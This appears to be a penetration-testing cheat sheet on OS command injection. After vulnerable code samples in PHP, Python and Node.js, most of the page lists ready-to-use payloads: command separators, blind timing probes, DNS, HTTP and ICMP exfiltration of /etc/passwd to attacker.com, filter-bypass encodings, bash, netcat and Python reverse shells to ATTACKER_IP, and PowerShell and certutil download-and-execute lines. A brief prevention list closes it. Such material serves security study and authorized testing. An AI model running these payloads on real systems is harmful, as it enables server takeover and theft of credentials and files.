---
title: OS Command Injection
category: web-attacks
tags:
  - command-injection
  - rce
  - shell-injection
  - web-exploitation
  - filter-bypass
last_updated: 2025-12-27
---

# OS Command Injection

Command injection vulnerabilities occur when user-supplied input is passed to a system shell without proper sanitization. This allows attackers to execute arbitrary operating system commands on the target server.

## Table of Contents

- [Command Injection Basics](#command-injection-basics)
- [Command Separators](#command-separators)
- [Blind Command Injection](#blind-command-injection)
- [Out-of-Band Techniques](#out-of-band-techniques)
- [Filter Bypass Techniques](#filter-bypass-techniques)
- [Platform-Specific Payloads](#platform-specific-payloads)
- [Tools and Automation](#tools-and-automation)

---

## Command Injection Basics

### Vulnerable Code Examples

**PHP:**
```php
<?php
$ip = $_GET['ip'];
system("ping -c 4 " . $ip);  // Vulnerable
?>
```

**Python:**
```python
import os
ip = request.args.get('ip')
os.system("ping -c 4 " + ip)  # Vulnerable
```

**Node.js:**
```javascript
const { exec } = require('child_process');
const ip = req.query.ip;
exec(`ping -c 4 ${ip}`);  // Vulnerable
```

### Basic Detection

```bash
# Test for command execution
; id
| id
|| id
& id
&& id
`id`
$(id)
```

---

## Command Separators

Different separators work in different contexts and operating systems.

### Unix/Linux Separators

```bash
# Semicolon - Sequential execution
; whoami
;whoami
;id;

# Pipe - Output redirection
| whoami
|whoami

# OR operator - Executes if previous fails
|| whoami

# AND operator - Executes if previous succeeds
&& whoami

# Background execution
& whoami

# Newline character
%0a whoami
%0d%0a whoami

# Command substitution (backticks)
`whoami`

# Command substitution (dollar syntax)
$(whoami)
```

### Windows Separators

```cmd
# Sequential execution
& whoami
&& whoami

# Pipe
| whoami

# OR operator
|| whoami

# Windows command substitution (limited)
$(whoami)    # PowerShell only
```

### Separator Variations

```bash
# URL encoded
%3B        # ;
%7C        # |
%26        # &
%0A        # newline
%0D%0A     # CRLF

# Double URL encoded
%253B      # ;
%257C      # |
%2526      # &

# Unicode/alternate encodings
%C0%BB     # Overlong encoding for ;
```

---

## Blind Command Injection

When there's no direct output, use these techniques to confirm command execution.

### Time-Based Detection

```bash
# Sleep commands (Unix)
; sleep 10
| sleep 10
|| sleep 10
&& sleep 10
`sleep 10`
$(sleep 10)

# Ping delay (Unix)
; ping -c 10 127.0.0.1
| ping -c 10 127.0.0.1

# Sleep commands (Windows)
& timeout /t 10 /nobreak
& ping -n 10 127.0.0.1

# PowerShell sleep
& powershell Start-Sleep -Seconds 10
```

### Conditional Time-Based

```bash
# If file exists, sleep (Unix)
; [ -f /etc/passwd ] && sleep 10
; test -f /etc/passwd && sleep 10

# Check command output
; [ $(whoami) = "root" ] && sleep 10

# Windows conditional
& if exist C:\Windows\System32\config\SAM ping -n 10 127.0.0.1
```

---

## Out-of-Band Techniques

### DNS Exfiltration

```bash
# Unix - using nslookup
; nslookup $(whoami).attacker.com
; host $(whoami).attacker.com
; dig $(whoami).attacker.com

# Unix - using curl/wget
; curl http://$(whoami).attacker.com
; wget http://$(whoami).attacker.com

# Exfiltrate file contents via DNS
; for line in $(cat /etc/passwd | xxd -p -c 30); do host $line.attacker.com; done

# Windows DNS exfiltration
& nslookup %USERNAME%.attacker.com
& powershell Resolve-DnsName "$env:USERNAME.attacker.com"
```

### HTTP Exfiltration

```bash
# Using curl (Unix)
; curl http://attacker.com/$(whoami)
; curl http://attacker.com/ -d "$(cat /etc/passwd)"
; curl http://attacker.com/?data=$(cat /etc/passwd | base64)

# Using wget (Unix)
; wget http://attacker.com/$(whoami)
; wget --post-data="$(cat /etc/passwd)" http://attacker.com/

# Windows HTTP exfiltration
& powershell IWR http://attacker.com/%USERNAME%
& powershell Invoke-WebRequest -Uri http://attacker.com -Method POST -Body (Get-Content C:\Users\file.txt)
& certutil -urlcache -split -f http://attacker.com/%USERNAME%
```

### ICMP Exfiltration

```bash
# Send data via ICMP (Unix)
; xxd -p -c 4 /etc/passwd | while read line; do ping -c 1 -p $line attacker.com; done
```

---

## Filter Bypass Techniques

### Space Bypass

```bash
# Using $IFS (Internal Field Separator)
cat$IFS/etc/passwd
cat${IFS}/etc/passwd
cat$IFS$9/etc/passwd

# Using tabs
;cat%09/etc/passwd

# Using brace expansion
{cat,/etc/passwd}
{cat,/etc/passwd,/etc/shadow}

# Using input redirection
cat</etc/passwd
cat<>/etc/passwd

# Using ANSI-C quoting
cat$'\x20'/etc/passwd
```

### Quote Bypass

```bash
# Concatenation without quotes
/bin/c""at /etc/passwd
/bin/c''at /etc/passwd
/bin/c``at /etc/passwd

# Using variables
a=c;b=at;$a$b /etc/passwd
v=cat;$v /etc/passwd

# Using wildcards
/bin/ca? /etc/passwd
/bin/c?t /etc/passwd
/???/c?t /etc/passwd
```

### Blacklist Bypass

```bash
# Encoding commands
echo "Y2F0IC9ldGMvcGFzc3dk" | base64 -d | sh
echo "636174202F6574632F706173737764" | xxd -r -p | sh

# Hex encoding
$(printf '\x63\x61\x74\x20\x2f\x65\x74\x63\x2f\x70\x61\x73\x73\x77\x64')

# Octal encoding
$(printf '\143\141\164\040\057\145\164\143\057\160\141\163\163\167\144')

# Using rev
echo "dwssap/cte/" | rev

# Using environment variables
${PATH%%:*}at /etc/passwd    # Extracts /bin or /usr/bin
```

### Slash Bypass

```bash
# Using environment variables
cat ${HOME:0:1}etc${HOME:0:1}passwd

# Using parameter substitution
cat ${PATH%%u*}etc${PATH%%u*}passwd

# Using printf
cat $(echo . | tr '!' '/')etc$(echo . | tr '!' '/')passwd
```

### Command Name Bypass

```bash
# Using wildcards
/bin/c?t /etc/passwd
/bin/ca* /etc/passwd
/???/c?t /etc/passwd
/???/c?? /etc/passwd

# Using aliases/alternatives
head /etc/passwd
tail /etc/passwd
more /etc/passwd
less /etc/passwd
sort /etc/passwd
uniq /etc/passwd

# Using string manipulation
c\at /etc/passwd
ca$@t /etc/passwd
c'a't /etc/passwd
c"a"t /etc/passwd
```

### Special Character Bypass

```bash
# Bypassing filtered characters
# Instead of: cat /etc/passwd
# Use:
$(echo Y2F0IC9ldGMvcGFzc3dk | base64 -d)
$'\143\141\164' $'\057\145\164\143\057\160\141\163\163\167\144'
```

---

## Platform-Specific Payloads

### Linux/Unix Payloads

```bash
# Information gathering
; id
; whoami
; uname -a
; cat /etc/passwd
; cat /etc/shadow
; ls -la /home
; env
; printenv

# Network information
; ifconfig
; ip addr
; netstat -an
; ss -tuln

# Reverse shell
; bash -i >& /dev/tcp/ATTACKER_IP/PORT 0>&1
; rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc ATTACKER_IP PORT >/tmp/f
; python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("ATTACKER_IP",PORT));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])'

# File operations
; cat /etc/passwd
; head -n 20 /etc/passwd
; tail /etc/passwd
; find / -perm -4000 2>/dev/null
```

### Windows Payloads

```cmd
# Information gathering
& whoami
& ipconfig
& systeminfo
& net user
& net localgroup administrators
& tasklist
& dir C:\Users

# PowerShell execution
& powershell -c "whoami"
& powershell -enc BASE64_ENCODED_COMMAND

# Reverse shell (PowerShell)
& powershell -c "IEX(New-Object Net.WebClient).downloadString('http://ATTACKER_IP/shell.ps1')"

# Download and execute
& certutil -urlcache -split -f http://ATTACKER_IP/payload.exe C:\Windows\Temp\payload.exe && C:\Windows\Temp\payload.exe
& powershell (New-Object Net.WebClient).DownloadFile('http://ATTACKER_IP/payload.exe','C:\Windows\Temp\payload.exe')
```

---

## Tools and Automation

### Commix

```bash
# Automatic command injection exploitation
commix -u "http://target.com/page?cmd=test"

# With authentication
commix -u "http://target.com/page?cmd=test" --cookie="session=abc123"

# Specific technique
commix -u "http://target.com/page?cmd=test" --technique=T  # Time-based

# OS shell
commix -u "http://target.com/page?cmd=test" --os-shell
```

### Manual Testing with curl

```bash
# Test command separators
curl "http://target.com/ping?ip=127.0.0.1;id"
curl "http://target.com/ping?ip=127.0.0.1|id"
curl "http://target.com/ping?ip=127.0.0.1||id"
curl "http://target.com/ping?ip=127.0.0.1%0aid"

# Blind injection with callback
curl "http://target.com/ping?ip=127.0.0.1;curl%20http://attacker.com/callback"
```

### Burp Suite Extensions

- **Commix** - Automated command injection
- **Command Injection Attacker** - Payload generation

---

## Prevention and Remediation

1. **Avoid System Calls**: Use language-specific libraries instead of shell commands
2. **Input Validation**: Whitelist allowed characters
3. **Parameterized Commands**: Use parameterized APIs (e.g., `subprocess` with list arguments in Python)
4. **Least Privilege**: Run web applications with minimal permissions
5. **WAF Rules**: Block common injection patterns
6. **Sandboxing**: Use containers or chroot environments

---

## References

- [OWASP Command Injection](https://owasp.org/www-community/attacks/Command_Injection)
- [PayloadsAllTheThings - Command Injection](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Command%20Injection)
- [HackTricks - Command Injection](https://book.hacktricks.xyz/pentesting-web/command-injection)
